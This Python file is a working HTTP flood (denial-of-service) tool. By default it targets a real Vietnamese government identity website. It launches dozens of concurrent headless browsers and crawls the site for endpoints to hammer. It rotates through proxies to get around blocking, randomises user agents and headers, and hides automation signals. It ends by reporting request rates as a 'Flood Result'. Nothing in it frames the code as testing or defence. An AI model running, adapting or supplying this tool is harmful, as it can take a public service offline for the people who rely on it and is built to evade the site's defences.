import asyncio
import random
import time
import os
import json
from playwright.async_api import async_playwright

TARGET_URL = os.getenv("TARGET_URL", "https://vneid.gov.vn/")
DURATION = int(os.getenv("DURATION", "60"))
CONCURRENCY = int(os.getenv("CONCURRENCY", "50"))
REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "20"))
PROXY_FILE = os.getenv("PROXY_FILE", "proxy.txt")
MAX_FAILURES = int(os.getenv("MAX_FAILURES", "2"))
PROXY_COOLDOWN = int(os.getenv("PROXY_COOLDOWN", "20"))
REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "60000"))
MAX_RETRIES = int(os.getenv("MAX_RETRIES", "5"))
MIN_DELAY = float(os.getenv("MIN_DELAY", "0.1"))
MAX_DELAY = float(os.getenv("MAX_DELAY", "0.5"))

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0"
]
ACCEPT_LANG = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja,en;q=0.8"]

success = 0
fail = 0
status_count = {}

class ProxyManager:
    def __init__(self, proxy_file):
        self.proxy_file = proxy_file
        self.proxies = self.load_proxies()
        self.proxy_status = {proxy: {"failures": 0, "last_failure": 0, "blocked": False, "success_count": 0, "response_times": []} for proxy in self.proxies}
        self.current_proxy_index = 0
        self.lock = asyncio.Lock()
        self.proxy_performance = {}
    
    def load_proxies(self):
        proxies = []
        try:
            with open(self.proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxies.append(line)
            print(f"Loaded {len(proxies)} proxies from {self.proxy_file}")
            return proxies
        except FileNotFoundError:
            print(f"Proxy file {self.proxy_file} not found. Running without proxies.")
            return []
        except Exception as e:
            print(f"Error loading proxies: {e}")
            return []
    
    async def get_next_proxy(self):
        async with self.lock:
            if not self.proxies:
                return None
            
            for proxy in self.proxies:
                if proxy in self.proxy_performance:
                    perf = self.proxy_performance[proxy]
                    success_rate = perf["success_count"] / max(1, perf["total_count"])
                    avg_response_time = sum(perf["response_times"]) / max(1, len(perf["response_times"]))
                    perf["score"] = success_rate / max(0.1, avg_response_time / 1000)
                else:
                    self.proxy_performance[proxy] = {
                        "success_count": 0,
                        "total_count": 0,
                        "response_times": [],
                        "score": 0.1
                    }
            
            sorted_proxies = sorted(
                self.proxies, 
                key=lambda p: self.proxy_performance[p]["score"],
                reverse=True
            )
            
            for proxy in sorted_proxies:
                proxy_info = self.proxy_status[proxy]
                current_time = time.time()
                if (not proxy_info["blocked"] and 
                    (current_time - proxy_info["last_failure"] > PROXY_COOLDOWN or 
                     proxy_info["failures"] < MAX_FAILURES)):
                    return proxy
            
            return sorted_proxies[0] if sorted_proxies else None
    
    async def mark_proxy_result(self, proxy, success, response_time=None):
        if proxy and proxy in self.proxy_status:
            async with self.lock:
                if success:
                    self.proxy_status[proxy]["failures"] = 0
                    self.proxy_status[proxy]["last_failure"] = 0
                    self.proxy_status[proxy]["success_count"] += 1
                    
                    if proxy in self.proxy_performance and response_time:
                        perf = self.proxy_performance[proxy]
                        perf["success_count"] += 1
                        perf["total_count"] += 1
                        perf["response_times"].append(response_time)
                        
                        if len(perf["response_times"]) > 10:
                            perf["response_times"] = perf["response_times"][-10:]
                        
                        success_rate = perf["success_count"] / max(1, perf["total_count"])
                        avg_response_time = sum(perf["response_times"]) / max(1, len(perf["response_times"]))
                        perf["score"] = success_rate / max(0.1, avg_response_time / 1000)
                else:
                    self.proxy_status[proxy]["failures"] += 1
                    self.proxy_status[proxy]["last_failure"] = time.time()
                    
                    if self.proxy_status[proxy]["failures"] >= MAX_FAILURES:
                        self.proxy_status[proxy]["blocked"] = True
                        print(f"Proxy {proxy} blocked due to too many failures")
    
    def get_proxy_stats(self):
        total = len(self.proxies)
        blocked = sum(1 for proxy in self.proxies if self.proxy_status[proxy]["blocked"])
        available = total - blocked
        
        best_proxies = sorted(
            self.proxies, 
            key=lambda p: self.proxy_performance[p]["score"] if p in self.proxy_performance else 0,
            reverse=True
        )[:5]
        
        return {
            "total": total,
            "blocked": blocked,
            "available": available,
            "best_proxies": best_proxies
        }

async def test_proxies(proxy_manager):
    print("Testing all proxies...")
    test_results = {}
    
    async with async_playwright() as p:
        for proxy in proxy_manager.proxies:
            try:
                browser = await p.chromium.launch(
                    headless=True,
                    proxy={"server": proxy},
                    args=["--no-sandbox", "--disable-setuid-sandbox"]
                )
                context = await browser.new_context()
                response = await context.request.get(TARGET_URL, timeout=10000)
                test_results[proxy] = {"success": response.ok, "status": response.status}
                await browser.close()
            except Exception as e:
                test_results[proxy] = {"success": False, "error": str(e)}
    
    working_proxies = [proxy for proxy, result in test_results.items() if result["success"]]
    print(f"Testing complete. {len(working_proxies)}/{len(proxy_manager.proxies)} proxies working.")
    
    if len(working_proxies) == 0:
        print("All proxies are blocked. Stopping attack.")
        return False
    
    return True

async def make_request_with_retry(context, url, proxy_manager, proxy, max_retries=MAX_RETRIES):
    start_time = time.time()
    
    for attempt in range(max_retries + 1):
        try:
            response = await context.request.get(url, timeout=REQUEST_TIMEOUT)
            response_time = int((time.time() - start_time) * 1000)
            
            await proxy_manager.mark_proxy_result(proxy, response.ok, response_time)
            
            return response
        except Exception as e:
            if attempt < max_retries:
                wait_time = min(2 ** attempt, 5)
                await asyncio.sleep(wait_time)
            else:
                await proxy_manager.mark_proxy_result(proxy, False)
                raise e

async def crawl_endpoints(context, base_url):
    endpoints = []
    try:
        response = await context.request.get(base_url)
        if response.ok:
            content = await response.text()
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(content, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href.startswith('/') or href.startswith(base_url):
                    full_url = href if href.startswith('http') else base_url + href
                    endpoints.append(full_url)
            
            for script in soup.find_all('script', src=True):
                src = script['src']
                if src.startswith('/') or src.startswith(base_url):
                    full_url = src if src.startswith('http') else base_url + src
                    endpoints.append(full_url)
                    
            for link in soup.find_all('link', href=True):
                href = link['href']
                if href.startswith('/') or href.startswith(base_url):
                    full_url = href if href.startswith('http') else base_url + href
                    endpoints.append(full_url)
    except:
        pass
    
    return endpoints

async def attack(playwright, worker_id, proxy_manager):
    global success, fail, status_count

    ua = random.choice(USER_AGENTS)
    lang = random.choice(ACCEPT_LANG)
    
    proxy = await proxy_manager.get_next_proxy()
    
    browser_args = [
        "--disable-web-security",
        "--disable-features=IsolateOrigins,site-per-process",
        "--disable-blink-features=AutomationControlled",
        "--no-sandbox",
        "--disable-dev-shm-usage",
        "--disable-setuid-sandbox",
        "--disable-gpu",
        "--disable-dev-shm-usage",
        "--disable-accelerated-2d-canvas",
        "--no-first-run",
        "--no-zygote",
        "--disable-software-rasterizer",
        "--disable-extensions",
        "--disable-plugins",
        "--disable-images",
        "--disable-javascript-har-prometheus-prometheus",
        "--disable-blink-features=AutomationControlled"
    ]
    
    if proxy:
        try:
            browser = await playwright.chromium.launch(
                headless=True,
                proxy={
                    "server": proxy
                },
                args=browser_args
            )
            print(f"Worker {worker_id} using proxy: {proxy}")
        except Exception as e:
            print(f"Worker {worker_id}: Failed to launch browser with proxy {proxy}: {e}")
            browser = await playwright.chromium.launch(
                headless=True,
                args=browser_args
            )
            print(f"Worker {worker_id} running without proxy after failure")
            proxy = None
    else:
        browser = await playwright.chromium.launch(
            headless=True,
            args=browser_args
        )
        print(f"Worker {worker_id} running without proxy")
    
    context = await browser.new_context(
        user_agent=ua,
        extra_http_headers={
            "Accept-Language": lang,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1"
        },
        ignore_https_errors=True,
        java_script_enabled=False,
        bypass_csp=True
    )

    endpoints = await crawl_endpoints(context, TARGET_URL)
    if not endpoints:
        endpoints = [TARGET_URL]
    
    start = time.time()
    consecutive_failures = 0
    proxy_rotation_count = 0
    max_proxy_rotations = 20
    
    while time.time() - start < DURATION and proxy_rotation_count < max_proxy_rotations:
        try:
            tasks = []
            for i in range(REQ_PER_LOOP):
                delay = random.uniform(MIN_DELAY, MAX_DELAY)
                target_url = random.choice(endpoints)
                tasks.append(asyncio.sleep(delay))
                tasks.append(make_request_with_retry(context, target_url, proxy_manager, proxy))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)

            batch_success = 0
            batch_fail = 0

            for i, res in enumerate(results):
                if i % 2 == 1:
                    if isinstance(res, Exception):
                        fail += 1
                        batch_fail += 1
                        status_count["exception"] = status_count.get("exception", 0) + 1
                    else:
                        if res.ok:
                            success += 1
                            batch_success += 1
                            status_count[res.status] = status_count.get(res.status, 0) + 1
                        else:
                            fail += 1
                            batch_fail += 1
                            status_count[res.status] = status_count.get(res.status, 0) + 1
            
            if proxy:
                total_requests = batch_success + batch_fail
                success_rate = batch_success / total_requests if total_requests > 0 else 0
                
                if success_rate < 0.1:
                    consecutive_failures += 1
                    
                    if consecutive_failures >= 1:
                        print(f"Worker {worker_id}: Low success rate ({success_rate:.2%}) with proxy {proxy}, rotating...")
                        
                        await context.close()
                        await browser.close()
                        
                        new_proxy = await proxy_manager.get_next_proxy()
                        if new_proxy != proxy:
                            proxy = new_proxy
                            proxy_rotation_count += 1
                            print(f"Worker {worker_id} switched to new proxy ({proxy_rotation_count}/{max_proxy_rotations}): {proxy}")
                            
                            try:
                                browser = await playwright.chromium.launch(
                                    headless=True,
                                    proxy={
                                        "server": proxy
                                    },
                                    args=browser_args
                                )
                                context = await browser.new_context(
                                    user_agent=ua,
                                    extra_http_headers={
                                        "Accept-Language": lang,
                                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                        "Accept-Encoding": "gzip, deflate, br",
                                        "Cache-Control": "max-age=0",
                                        "Connection": "keep-alive",
                                        "Upgrade-Insecure-Requests": "1",
                                        "Sec-Fetch-Dest": "document",
                                        "Sec-Fetch-Mode": "navigate",
                                        "Sec-Fetch-Site": "none",
                                        "Sec-Fetch-User": "?1"
                                    },
                                    ignore_https_errors=True,
                                    java_script_enabled=False,
                                    bypass_csp=True
                                )
                            except Exception as e:
                                print(f"Worker {worker_id}: Failed to launch browser with new proxy {proxy}: {e}")
                                browser = await playwright.chromium.launch(
                                    headless=True,
                                    args=browser_args
                                )
                                context = await browser.new_context(
                                    user_agent=ua,
                                    extra_http_headers={
                                        "Accept-Language": lang,
                                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                        "Accept-Encoding": "gzip, deflate, br",
                                        "Cache-Control": "max-age=0",
                                        "Connection": "keep-alive",
                                        "Upgrade-Insecure-Requests": "1",
                                        "Sec-Fetch-Dest": "document",
                                        "Sec-Fetch-Mode": "navigate",
                                        "Sec-Fetch-Site": "none",
                                        "Sec-Fetch-User": "?1"
                                    },
                                    ignore_https_errors=True,
                                    java_script_enabled=False,
                                    bypass_csp=True
                                )
                                proxy = None
                        
                        consecutive_failures = 0
                else:
                    consecutive_failures = 0
            
        except Exception as e:
            print(f"Worker {worker_id}: Error in batch: {e}")
            if proxy:
                await proxy_manager.mark_proxy_result(proxy, False)

    await browser.close()

async def main():
    proxy_manager = ProxyManager(PROXY_FILE)
    
    stats = proxy_manager.get_proxy_stats()
    print(f"Proxy statistics: {stats['total']} total, {stats['available']} available, {stats['blocked']} blocked")
    print(f"Top 5 best proxies: {stats['best_proxies']}")
    
    if not await test_proxies(proxy_manager):
        return
    
    async with async_playwright() as p:
        tasks = [attack(p, i, proxy_manager) for i in range(CONCURRENCY)]
        await asyncio.gather(*tasks)

    total = success + fail
    print(f"\n=== Flood Result ===")
    print(f"Target: {TARGET_URL}")
    print(f"Duration: {DURATION} seconds")
    print(f"Concurrency: {CONCURRENCY}")
    print(f"Requests per loop: {REQ_PER_LOOP}")
    print(f"Total requests: {total}")
    print(f"Success (2xx): {success}")
    print(f"Fail/Blocked: {fail}")
    print(f"Success rate: {success/total*100:.2f}%")
    print(f"RPS ~ {total / DURATION:.2f}")
    print("Status breakdown:", status_count)
    
    stats = proxy_manager.get_proxy_stats()
    print(f"Final proxy statistics: {stats['total']} total, {stats['available']} available, {stats['blocked']} blocked")
    print(f"Top 5 best proxies: {stats['best_proxies']}")

if __name__ == "__main__":
    asyncio.run(main())
